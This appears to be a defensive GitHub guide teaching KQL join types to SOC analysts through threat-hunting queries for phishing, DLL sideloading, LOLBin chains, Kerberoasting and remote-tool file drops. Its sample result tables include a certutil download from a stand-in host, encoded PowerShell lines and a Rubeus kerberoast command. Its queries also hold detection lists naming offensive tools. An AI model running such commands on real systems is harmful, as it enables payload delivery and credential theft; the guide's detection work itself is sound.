# KQL JOIN PLAYBOOK FOR SOC ANALYSTS & HUNTERS  
_Core examples: Email → URL → Device • DLL Sideloading • LOLBin Chains • Kerberos Abuse • RDP / Remote Access_

This is a **copy-paste GitHub guide** showing **how joins actually work in real SOC scenarios**, with:

- ASCII table diagrams showing keys and join paths  
- Realistic **native-only** KQL (no external TI/CTI)  
- Example result tables an analyst would actually see  
- Explanations of **inner / leftouter / leftsemi / leftanti** joins in threat-hunting context  
- MITRE ATT&CK mapping, analysis notes, and recommended actions  

Included scenarios (all common / recognisable to any SOC):

1. Email phishing → URL click → device context (Entra / M365D / Sentinel)  
2. DLL sideloading → user-writable paths → rare DLLs  
3. LOLBin macro chain → process + file + network (Word → PowerShell → Certutil → C2)  
4. Kerberos abuse (Kerberoasting / suspicious service tickets)  
5. RDP / remote-access tools → file drops (basic remote-access hunt)  

---

## 0. KQL JOIN BASICS (CHEAT SHEET FOR THREAT HUNTING)

### 0.1 Core join kinds

```kql
TableA
| join [kind=inner] TableB on KeyColumn

TableA
| join kind=leftouter TableB on KeyColumn

TableA
| join kind=leftsemi TableB on KeyColumn

TableA
| join kind=leftanti TableB on KeyColumn
```

**Conceptual behaviour**

- **inner**  
  - Keep rows **only where keys match** on both sides  
  - Typical when you want “things that have BOTH A and B”  
  - Good for: *“emails that were actually clicked”*, *“processes that also had network activity”*  

- **leftouter**  
  - Keep **all rows from the left**; add columns from right **when a match exists**, otherwise null  
  - Good for: enriching a primary dataset with optional context  
  - Example: “show all suspicious processes, and add network/file info if available”  

- **leftsemi**  
  - Filter left table to rows that have a match on right, **without bringing right-hand columns**  
  - Use when right table is just a filter / existence check  
  - Example: “processes that did talk to the internet”  

- **leftanti**  
  - Keep left rows that **do NOT** have a match on the right  
  - Perfect for: *“not in allow-list”* or *“has no known-good baseline record”*  
  - Example: “hash not in internal allow-list”, “new OAuth apps not in approved list”  

---

### 0.2 Tiny toy example – inner vs leftouter vs semi/anti

Assume we have:

**TableA – SuspiciousProcesses**

| DeviceId | ProcessId | FileName       |
| -------- | --------- | ------------- |
| D1       | 101       | powershell.exe |
| D1       | 102       | cmd.exe       |
| D2       | 201       | mshta.exe     |

**TableB – NetActivityByProcess**

| DeviceId | InitiatingProcessId | RemoteIP      |
| -------- | ------------------- | ------------- |
| D1       | 101                 | 10.10.10.10   |
| D1       | 999                 | 8.8.8.8       |

#### inner join

```kql
SuspiciousProcesses
| join kind=inner NetActivityByProcess
    on $left.DeviceId == $right.DeviceId
    and $left.ProcessId == $right.InitiatingProcessId
```

**Result**

| DeviceId | ProcessId | FileName       | RemoteIP    |
| -------- | --------- | ------------- | ----------- |
| D1       | 101       | powershell.exe | 10.10.10.10 |

> Only the **matching process** (powershell.exe) remains. No row for cmd.exe or mshta.exe.

#### leftouter join

```kql
SuspiciousProcesses
| join kind=leftouter NetActivityByProcess
    on $left.DeviceId == $right.DeviceId
    and $left.ProcessId == $right.InitiatingProcessId
```

**Result**

| DeviceId | ProcessId | FileName        | RemoteIP    |
| -------- | --------- | -------------- | ----------- |
| D1       | 101       | powershell.exe  | 10.10.10.10 |
| D1       | 102       | cmd.exe         | null        |
| D2       | 201       | mshta.exe       | null        |

> Keep **all suspicious processes**; network info is “optional enrichment”.

#### leftsemi

```kql
SuspiciousProcesses
| join kind=leftsemi NetActivityByProcess
    on $left.DeviceId == $right.DeviceId
    and $left.ProcessId == $right.InitiatingProcessId
```

**Result**

| DeviceId | ProcessId | FileName       |
| -------- | --------- | ------------- |
| D1       | 101       | powershell.exe |

> “Show me suspicious processes that **did** have network activity” (no need for RemoteIP column).

#### leftanti

```kql
SuspiciousProcesses
| join kind=leftanti NetActivityByProcess
    on $left.DeviceId == $right.DeviceId
    and $left.ProcessId == $right.InitiatingProcessId
```

**Result**

| DeviceId | ProcessId | FileName   |
| -------- | --------- | --------- |
| D1       | 102       | cmd.exe   |
| D2       | 201       | mshta.exe |

> “Show me suspicious processes that **did NOT** have network activity” – useful for finding dormant implants / staging.

---

## 1. EMAIL → URL CLICK → DEVICE RISK

**Goal:** Understand how to correlate **email → user → click → device** using joins.  
**Tables:** `EmailEvents`, `UrlClickEvents`, `DeviceInfo` (or equivalent in your environment).  

### 1.1 Tables & keys (ASCII diagram)

```text
┌────────────────────────────┐
│        EmailEvents         │
│────────────────────────────│
│ NetworkMessageId (PK)  ◄────────────┐
│ RecipientEmailAddress               │
│ SenderFromAddress                   │
│ Subject                             │
│ ThreatTypes                         │
│ Timestamp                           │
└────────────────────────────┘        │
                                      │ inner join on NetworkMessageId
┌────────────────────────────┐        │
│       UrlClickEvents       │────────┘
│────────────────────────────│
│ NetworkMessageId (FK)      │
│ Url                        │
│ UrlDomain                  │
│ ClickAction                │
│ DeviceId (FK)         ◄────────────┐
│ Timestamp                       │  │
└────────────────────────────┘     │  │ inner join on DeviceId
                                  │  │
┌────────────────────────────┐     │  │
│        DeviceInfo          │─────┘  │
│────────────────────────────│        │
│ DeviceId (PK)              │        │
│ DeviceName                 │        │
│ OSPlatform                 │        │
│ RiskScore                  │        │
│ LoggedOnUsers              │        │
└────────────────────────────┘        │
```

### 1.2 Hunt: “Which risky devices clicked phishing emails?”

```kql
let Lookback = 7d;

EmailEvents
| where Timestamp >= ago(Lookback)
| where ThreatTypes has_any ("Phish", "Malware")   // depends on schema
// 1) Email → URL
| join kind=inner (
    UrlClickEvents
    | where Timestamp >= ago(Lookback)
) on NetworkMessageId
// 2) URL → Device
| join kind=inner (
    DeviceInfo
    | where Timestamp >= ago(Lookback)
) on DeviceId
| project
    EmailTime   = EmailEvents.Timestamp,
    ClickTime   = UrlClickEvents.Timestamp,
    Recipient   = RecipientEmailAddress,
    Sender      = SenderFromAddress,
    Subject,
    Url,
    UrlDomain,
    DeviceName,
    OSPlatform,
    RiskScore,
    LoggedOnUsers
| order by ClickTime desc
```

**Example analyst output**

| EmailTime           | ClickTime           | Recipient                    | Url                             | DeviceName | RiskScore | LoggedOnUsers     |
| ------------------- | ------------------- | ---------------------------- | ------------------------------- | ---------- | --------- | ----------------- |
| 2025-12-03 09:01:22 | 2025-12-03 09:02:05 | john@corp.com               | http://haxx.evil/payload       | WIN-JOHN   | High      | ["john"]          |
| 2025-12-03 09:01:22 | 2025-12-03 09:03:44 | oliver@corp.com             | http://haxx.evil/payload       | WIN-OLIVER | Medium    | ["oliver"]        |

**Why `inner` joins?**

- We only want **emails that were actually clicked** and **devices that actually exist**.  
- Rows without a click or without a matching device are irrelevant for this particular hunt.

**MITRE mapping**

- TA0001 – Initial Access  
- T1566 – Phishing  
- T1204.002 – User Execution: Malicious File / Link  

**Recommended actions**

- Prioritise devices with **High RiskScore** and multiple phishing clicks.  
- Check `DeviceProcessEvents` for subsequent macros / LOLBin activity (e.g. Word → PowerShell).  
- Add offending domains to block lists; consider training for repeat victims.

---

## 2. DLL SIDELOADING — PROCESS + IMAGE LOAD (NATIVE ONLY)

**Goal:** Catch processes loading DLLs from **user-writable locations** (classic sideload pattern) using only native telemetry.

**Tables:** `DeviceImageLoadEvents`, `DeviceProcessEvents`.

### 2.1 Tables & keys

```text
┌────────────────────────────┐
│    DeviceProcessEvents     │
│────────────────────────────│
│ DeviceId              ◄────────────┐
│ ProcessId (PK-ish)    ◄───────┐    │
│ FileName (process)            │    │
│ FolderPath                    │    │
│ ProcessCommandLine            │    │
│ Timestamp                     │    │
└────────────────────────────┘  │    │
                                │    │ join on DeviceId + ProcessId
┌────────────────────────────┐  │    │
│   DeviceImageLoadEvents    │──┘    │
│────────────────────────────│       │
│ DeviceId                   │       │
│ InitiatingProcessId (FK)   │───────┘
│ FileName (DLL)             │
│ FolderPath                 │
│ SHA256 (if available)      │
│ Timestamp                  │
└────────────────────────────┘
```

### 2.2 Hunt: “DLLs loaded from user paths (with host process)”

```kql
let Lookback = 7d;
let UserWritableRegex = @"(?i)\\users\\|\\appdata\\|\\temp\\|\\programdata\\";

// 1) DLL loads from user-writable paths
let SuspiciousDllLoads =
DeviceImageLoadEvents
| where Timestamp >= ago(Lookback)
| where FileName endswith ".dll"
| where FolderPath matches regex UserWritableRegex
| project
    Timestamp,
    DeviceId,
    DeviceName,
    DllName   = FileName,
    DllPath   = FolderPath,
    InitiatingProcessId;

// 2) Enrich with host process info (leftouter = keep all DLL loads)
SuspiciousDllLoads
| join kind=leftouter (
    DeviceProcessEvents
    | where Timestamp >= ago(Lookback)
    | project
        DeviceId,
        ProcessId,
        HostProcessName = FileName,
        HostProcessPath = FolderPath,
        HostCmd         = ProcessCommandLine,
        HostAccount     = AccountName
) on DeviceId, InitiatingProcessId == ProcessId
| project
    Timestamp,
    DeviceName,
    HostProcessName,
    HostProcessPath,
    HostCmd,
    HostAccount,
    DllName,
    DllPath
| order by Timestamp desc
```

**Example analyst output**

| Timestamp           | DeviceName | HostProcessName | HostProcessPath                         | DllName        | DllPath                                     | HostAccount   |
| ------------------- | ---------- | --------------- | --------------------------------------- | -------------- | ------------------------------------------- | ------------ |
| 2025-12-03 10:11:22 | WIN-HR01   | teams.exe       | C:\Program Files\Teams\current\...      | version.dll    | C:\Users\hruser\AppData\Roaming\version.dll | HRDOMAIN\hr1 |
| 2025-12-03 11:47:09 | WIN-ENG02  | outlook.exe     | C:\Program Files\Microsoft Office\...   | msedge.dll     | C:\Users\eng\AppData\Local\Temp\msedge.dll  | ENG\eng      |

**Why `leftouter`?**

- Primary interest is **“DLL load from user path”** (left table).  
- Host process enrichment is helpful, but you **don’t want to drop DLL rows** just because process context is missing (e.g. retention gap).

**MITRE mapping**

- TA0005 – Defense Evasion  
- T1574.002 – Hijack Execution Flow: DLL Side-Loading  

**Recommended actions**

- Look for **office or chat apps** (Teams, Outlook, browsers) loading DLLs from user folders.  
- Validate if DLL paths are part of known installers or patching tools.  
- If suspicious: pull the DLL sample, check parent process tree, and search for similar patterns across estate.

---

## 3. LOLBIN CHAIN — PROCESS → FILE → NETWORK (WORD → POWERSHELL → CERTUTIL → C2)

**Goal:** Show how joins connect process, file, and network telemetry to reconstruct an execution chain.

**Tables:** `DeviceProcessEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`.

### 3.1 Logical model

```text
┌────────────────────────────┐
│    DeviceProcessEvents     │
│────────────────────────────│
│ DeviceId                   │◄─────────┐
│ ProcessId (PK-ish)         │◄─────┐   │
│ FileName                   │      │   │
│ ParentProcessId            │      │   │
│ ParentProcessName          │      │   │
│ ProcessCommandLine         │      │   │
│ Timestamp                  │      │   │
└────────────────────────────┘      │   │
                                    │   │ join on DeviceId + InitiatingProcessId
┌────────────────────────────┐      │   │
│     DeviceFileEvents       │──────┘   │
│────────────────────────────│          │
│ DeviceId                   │          │
│ InitiatingProcessId (FK)   │──────────┘
│ FileName                   │
│ FolderPath                 │
│ ActionType                 │
│ Timestamp                  │
└────────────────────────────┘

┌────────────────────────────┐
│    DeviceNetworkEvents     │
│────────────────────────────│
│ DeviceId                   │
│ InitiatingProcessId (FK)   │──────────┐
│ RemoteIP                   │          │
│ RemoteUrl                  │          │
│ RemotePort                 │          │
│ Timestamp                  │          │
└────────────────────────────┘          │
```

### 3.2 Hunt: Office → PowerShell → Certutil with file + C2

```kql
let Lookback = 7d;

// 1) Office → PowerShell
let PsFromOffice =
DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName in~ ("powershell.exe","pwsh.exe")
| where ParentProcessName in~ ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
| project
    DeviceId,
    DeviceName,
    PsTime   = Timestamp,
    PsId     = ProcessId,
    PsCmd    = ProcessCommandLine,
    OfficeParent = ParentProcessName;

// 2) PowerShell → Certutil
let CertFromPs =
DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName =~ "certutil.exe"
| project
    DeviceId,
    CertTime = Timestamp,
    CertId   = ProcessId,
    ParentProcessId,
    CertCmd  = ProcessCommandLine;

// 3) Join Office→PS with Certutil (inner = require full chain)
let PsAndCert =
PsFromOffice
| join kind=inner CertFromPs
    on DeviceId, PsId == ParentProcessId;

// 4) Certutil file writes (leftouter = optional enrichment)
let FilesByCert =
DeviceFileEvents
| where Timestamp >= ago(Lookback)
| where FolderPath matches regex @"(?i)\\users\\|\\appdata\\|\\temp\\"
| project
    DeviceId,
    InitiatingProcessId,
    FileTime = Timestamp,
    WrittenFile = FileName,
    WrittenPath = FolderPath;

let NetByCert =
DeviceNetworkEvents
| where Timestamp >= ago(Lookback)
| project
    DeviceId,
    InitiatingProcessId,
    NetTime = Timestamp,
    RemoteIP,
    RemoteUrl,
    RemotePort;

// 5) Combine all
PsAndCert
| join kind=leftouter FilesByCert
    on DeviceId, CertId == InitiatingProcessId
| join kind=leftouter NetByCert
    on DeviceId, CertId == InitiatingProcessId
| project
    DeviceName,
    OfficeParent,
    PsTime,
    PsCmd,
    CertTime,
    CertCmd,
    WrittenFile,
    WrittenPath,
    RemoteIP,
    RemoteUrl,
    RemotePort
| order by PsTime desc
```

**Example analyst output**

| DeviceName | OfficeParent | PsCmd                                | CertCmd                                               | WrittenFile | WrittenPath                               | RemoteUrl                   |
| ---------- | ------------ | ------------------------------------ | ----------------------------------------------------- | ----------- | ----------------------------------------- | --------------------------- |
| WIN-FIN01  | winword.exe  | powershell.exe -nop -enc \<…>        | certutil.exe -urlcache -split -f http://haxx/p.b64…  | payload.exe | C:\Users\fin\AppData\Roaming\payload.exe | http://haxx.evil/payload.b64 |

**Why join kinds?**

- `inner` between PowerShell and Certutil: we want the **full macro → PowerShell → Certutil chain**.  
- `leftouter` to file/network: file or network telemetry may be missing for some events, but we still want to see the chain when present.

**MITRE mapping**

- TA0002 – Execution  
- T1204 – User Execution (malicious doc)  
- T1059 – Command and Scripting Interpreter (PowerShell)  
- T1105 – Ingress Tool Transfer (certutil download)  

**Recommended actions**

- Immediate triage on devices where Word → PowerShell → Certutil chain occurs.  
- Extract downloaded payload; check `RemoteUrl` and `RemoteIP` for further hits across estate.  
- Add network/domain IOCs to blocking; consider disabling Office macros from internet-sourced docs.

---

## 4. KERBEROS ABUSE (KERBEROASTING / SUSPICIOUS SERVICE TICKETS)

**Goal:** Show join use for **identity-centric** hunting: mapping ticket requests to devices and processes.

**Tables:** `SecurityEvent` (DC logs), `DeviceLogonEvents`, `DeviceProcessEvents`.

> Note: field names can vary by connector; adjust to your schema.

### 4.1 Tables & keys

```text
┌───────────────────────────────────────────────┐
│              SecurityEvent (DC)              │
│───────────────────────────────────────────────│
│ TimeGenerated                                │
│ Computer (DC name)                           │
│ EventID (4769 = TGS request)                 │
│ TargetUserName (service account/SPN)         │
│ IpAddress (client IP)                        │◄─────────────┐
└───────────────────────────────────────────────┘             │

┌───────────────────────────────────────────────┐             │
│              DeviceLogonEvents               │─────────────┘
│───────────────────────────────────────────────│
│ Timestamp                                     │
│ DeviceName                                   │
│ DeviceId                                     │
│ AccountName                                  │
│ RemoteIP                                     │◄─────────┐
│ LogonType                                    │         │
└───────────────────────────────────────────────┘         │
                                                          │ join on IP/Device
┌───────────────────────────────────────────────┐         │
│            DeviceProcessEvents               │─────────┘
│───────────────────────────────────────────────│
│ Timestamp                                     │
│ DeviceId                                     │
│ ProcessId                                    │
│ FileName                                     │
│ ProcessCommandLine                           │
│ AccountName                                  │
└───────────────────────────────────────────────┘
```

### 4.2 Hunt: “High-value service tickets requested from unusual endpoints”

```kql
let Lookback = 7d;

// 1) Service ticket requests from DC logs (EventID 4769)
let TGSEvents =
SecurityEvent
| where TimeGenerated >= ago(Lookback)
| where EventID == 4769
| extend
    ClientIP       = tostring(IpAddress),
    ServiceAccount = tostring(TargetUserName)
| where ClientIP !in ("::1","127.0.0.1")
| project
    TgsTime = TimeGenerated,
    ServiceAccount,
    ClientIP;

// 2) Map client IPs to devices
let IpToDevice =
DeviceLogonEvents
| where Timestamp >= ago(Lookback)
| where isnotempty(RemoteIP)
| summarize
    DeviceName = any(DeviceName),
    DeviceId   = any(DeviceId),
    Accounts   = make_set(AccountName, 5)
  by RemoteIP;

// 3) Join TGS → Device
let TGSEnriched =
TGSEvents
| join kind=leftouter IpToDevice
    on $left.ClientIP == $right.RemoteIP;

// 4) Add recent process context on those devices
TGSEnriched
| join kind=leftouter (
    DeviceProcessEvents
    | where Timestamp >= ago(Lookback)
    | where FileName in~ ("rubeus.exe","mimikatz.exe","kekeo.exe","powershell.exe","python.exe")
    | project
        DeviceId,
        ProcTime = Timestamp,
        ProcName = FileName,
        ProcCmd  = ProcessCommandLine,
        ProcAccount = AccountName
) on DeviceId
| project
    TgsTime,
    ServiceAccount,
    ClientIP,
    DeviceName,
    Accounts,
    ProcTime,
    ProcName,
    ProcCmd,
    ProcAccount
| order by TgsTime desc
```

**Example analyst output**

| TgsTime             | ServiceAccount    | ClientIP     | DeviceName | Accounts           | ProcName      | ProcCmd                            |
| ------------------- | ---------------- | ------------ | ---------- | ------------------ | ------------- | ---------------------------------- |
| 2025-12-03 08:11:22 | sqlsvc-prod      | 10.10.20.44  | WIN-ENG09  | ["ENG\\admin1"]    | rubeus.exe    | Rubeus.exe kerberoast /nowrap …    |
| 2025-12-03 09:47:01 | http/webfront    | 10.10.40.90  | WIN-HR01   | ["HR\\hruser"]     | powershell.exe| powershell.exe -nop -enc \<…>      |

**Join rationale**

- `leftouter` from TGS → Device: you **keep all ticket requests**, even if some IPs don’t map cleanly to a device (e.g. VPN, missing logs).  
- `leftouter` to process events: process info is **enrichment**, not a filter; missing process rows shouldn’t drop TGS evidence.

**MITRE mapping**

- TA0006 – Credential Access  
- T1558.003 – Steal or Forge Kerberos Tickets: Kerberoasting  

**Recommended actions**

- Focus on **high-value service accounts** (SQL, HTTP front-ends, domain services) requested from **workstations** rather than servers.  
- Investigate devices where `rubeus.exe`, `mimikatz.exe`, or suspicious PowerShell is present.  
- Check for subsequent lateral movement from those endpoints.

---

## 5. RDP / REMOTE ACCESS + SUSPICIOUS FILE DROPS

**Goal:** Basic but solid hunt for **remote access tools** touching the filesystem – common, recognisable, and join-driven.

**Tables:** `DeviceNetworkEvents`, `DeviceFileEvents`, `DeviceProcessEvents`.

### 5.1 Tables & keys

```text
┌────────────────────────────┐
│    DeviceNetworkEvents     │
│────────────────────────────│
│ Timestamp                  │
│ DeviceId                   │◄────────┐
│ DeviceName                 │         │
│ InitiatingProcessId (FK)   │─────┐   │
│ InitiatingProcessFileName  │     │   │
│ RemoteIP                   │     │   │
│ RemotePort                 │     │   │
│ RemoteIPType               │     │   │
└────────────────────────────┘     │   │
                                   │   │ join on DeviceId + InitiatingProcessId
┌────────────────────────────┐     │   │
│     DeviceFileEvents       │─────┘   │
│────────────────────────────│         │
│ Timestamp                  │         │
│ DeviceId                   │         │
│ InitiatingProcessId (FK)   │─────────┘
│ InitiatingProcessFileName  │
│ FileName                   │
│ FolderPath                 │
│ ActionType                 │
└────────────────────────────┘
```

### 5.2 Hunt: Public RDP/remote tools creating/altering executable files

```kql
let Lookback = 7d;

let RemoteTools = dynamic([
    "mstsc.exe",            // native RDP
    "rdpclip.exe",
    "tscon.exe",
    "qprocess.exe",
    "anydesk.exe",
    "teamviewer.exe",
    "vncviewer.exe",
    "winvnc.exe",
    "tvnserver.exe",
    "ScreenConnect.Client.exe",
    "chrome_remote_desktop.exe"
]);

let SuspiciousExtensions = dynamic([
    ".exe",".dll",".sys",".ps1",".bat",".cmd",".vbs",".js",".jse",".scr"
]);

// 1) Network connections for remote tools to public IPs
let RemoteToolNet =
DeviceNetworkEvents
| where Timestamp >= ago(Lookback)
| where InitiatingProcessFileName in~ (RemoteTools)
| where RemoteIPType == "Public"
| project
    NetTime   = Timestamp,
    DeviceId,
    DeviceName,
    ToolName  = InitiatingProcessFileName,
    ToolProcId = InitiatingProcessId,
    RemoteIP,
    RemotePort;

// 2) File creations/modifications by same tools
let RemoteToolFileOps =
DeviceFileEvents
| where Timestamp >= ago(Lookback)
| where InitiatingProcessFileName in~ (RemoteTools)
| where ActionType in ("FileCreated","FileModified")
| extend FileExt = tolower(strcat(".", split(FileName, ".")[-1]))
| where FileExt in (SuspiciousExtensions)
| project
    FileTime = Timestamp,
    DeviceId,
    InitiatingProcessId,
    InitiatingProcessFileName,
    FileName,
    FolderPath,
    FileExt;

// 3) Join network + file on device + process
RemoteToolNet
| join kind=inner RemoteToolFileOps
    on DeviceId, ToolProcId == InitiatingProcessId
| project
    DeviceName,
    ToolName,
    NetTime,
    RemoteIP,
    RemotePort,
    FileTime,
    FileName,
    FolderPath,
    FileExt
| order by NetTime desc
```

**Example analyst output**

| DeviceName | ToolName                 | RemoteIP      | RemotePort | FileName     | FolderPath                                  |
| ---------- | ------------------------ | ------------- | ---------- | ------------ | ------------------------------------------- |
| WIN-ACCT01 | anydesk.exe              | 198.51.100.12 | 443        | payload.exe  | C:\Users\acct\AppData\Local\Temp\payload.exe |
| WIN-SUPP02 | ScreenConnect.Client.exe | 203.0.113.44  | 443        | run.ps1      | C:\Users\tech\AppData\Roaming\scripts\run.ps1 |

**Why `inner`?**

- This hunt is specifically about **remote-tool sessions that also perform file drops / modifications**, so we only care when **both** conditions are true.

**MITRE mapping**

- TA0008 – Lateral Movement  
- T1021.001 – Remote Services: RDP  
- T1219 – Remote Access Software  

**Recommended actions**

- Validate whether identified remote tools are **approved and centrally managed**.  
- For suspicious file drops, investigate contents and parent process tree; look for follow-on process execution.  
- If tools are not authorised: consider blocking and removing them, plus reviewing access logs.

---

## 6. ADVANCED JOIN PATTERNS & DEBUGGING (IN HUNT CONTEXT)

### 6.1 Fan-out explosion and how to avoid it

A common mistake:

- Start with `DeviceProcessEvents` (many rows).  
- Join directly to `DeviceNetworkEvents` (many rows).  
- Then join to `DeviceFileEvents` (many rows).  

You can end up with **N × M × K** rows.

**Better pattern:** aggregate children first, then join.

```kql
let Lookback = 7d;

// Aggregate network per process
let NetByProc =
DeviceNetworkEvents
| where Timestamp >= ago(Lookback)
| summarize
    RemoteIPs  = make_set(RemoteIP, 10),
    Urls       = make_set(RemoteUrl, 10),
    FirstNet   = min(Timestamp),
    LastNet    = max(Timestamp)
  by DeviceId, InitiatingProcessId;

// Aggregate file events per process
let FilesByProc =
DeviceFileEvents
| where Timestamp >= ago(Lookback)
| summarize
    WrittenFiles = make_set(FileName, 20),
    Paths        = make_set(FolderPath, 20)
  by DeviceId, InitiatingProcessId;

// Join once onto processes of interest
DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName in ("powershell.exe","certutil.exe")
| join kind=leftouter NetByProc
    on DeviceId, ProcessId == InitiatingProcessId
| join kind=leftouter FilesByProc
    on DeviceId, ProcessId == InitiatingProcessId
| project
    Timestamp,
    DeviceName,
    FileName,
    ProcessCommandLine,
    RemoteIPs,
    Urls,
    WrittenFiles,
    Paths
```

**Key point:** summarise children before the join to avoid huge row blow-ups.

---

### 6.2 leftsemi for “has activity” filters

Example: “Show me PowerShell processes that **had any** network connections at all.”

```kql
let Lookback = 7d;

let ProcsWithNet =
DeviceNetworkEvents
| where Timestamp >= ago(Lookback)
| summarize by DeviceId, InitiatingProcessId;

DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName in ("powershell.exe","pwsh.exe")
| join kind=leftsemi ProcsWithNet
    on DeviceId, ProcessId == InitiatingProcessId
```

> `leftsemi` is a **filter**: you keep only rows from the left that had a match, and you don’t clutter the result with extra columns.

---

### 6.3 leftanti for baselines / allow-lists

Example: “Processes whose hash is **not** in my internal allow-list.”

```kql
let HashAllowlist =
AllowlistedBinaries
| project SafeHash = SHA256;

DeviceProcessEvents
| where Timestamp >= ago(7d)
| where isnotempty(SHA256)
| join kind=leftanti HashAllowlist
    on $left.SHA256 == $right.SafeHash
```

> This is core for **baseline-driven hunting** – deviations from known-good are often more interesting than known-bad.

---

### 6.4 materialize() for re-use

When you need the **same aggregated child table** multiple times:

```kql
let Lookback = 7d;

let NetAgg = materialize(
  DeviceNetworkEvents
  | where Timestamp >= ago(Lookback)
  | summarize
      RemoteIPs = make_set(RemoteIP, 10),
      Urls      = make_set(RemoteUrl, 10)
    by DeviceId, InitiatingProcessId
);

// use NetAgg in multiple joins without re-scanning the big table
DeviceProcessEvents
| where Timestamp >= ago(Lookback)
| where FileName in ("powershell.exe","certutil.exe")
| join kind=leftouter NetAgg
    on DeviceId, ProcessId == InitiatingProcessId
```

---

## 7. SUMMARY – HOW TO THINK ABOUT JOINS IN IR & HUNTING

- Use **inner joins** when you need a **strict intersection** (email that was clicked; PowerShell that definitely spawned Certutil).  
- Use **leftouter** when you have a **primary hunt surface** and want to **enrich it safely** (DLL loads from user paths, optionally enriched with process context).  
- Use **leftsemi** when you only care about “exists on the right side” (PowerShell that had any network).  
- Use **leftanti** for **baseline deviation** (not in allow-list, not in inventory).  
- Always think in terms of **keys and direction of investigation**:  
  - “What is my primary object?” (email, process, ticket, device) → this goes on the **left**.  
  - “What extra context do I want if it exists?” → this goes on the **right** with `leftouter`.  

Each example in this document is designed to be:

- **Native only** (no external TI)  
- **Core & recognisable** to any SOC analyst  
- **Join-driven** so you can see how tables link in real investigations  

You can now extend these patterns to your own hunts (e.g. NTDS.dit access, browser extension abuse, OAuth grants) by re-using the same join logic and thinking in terms of: **“What is my left table, what is my right table, and what key actually links them?”**  
````0
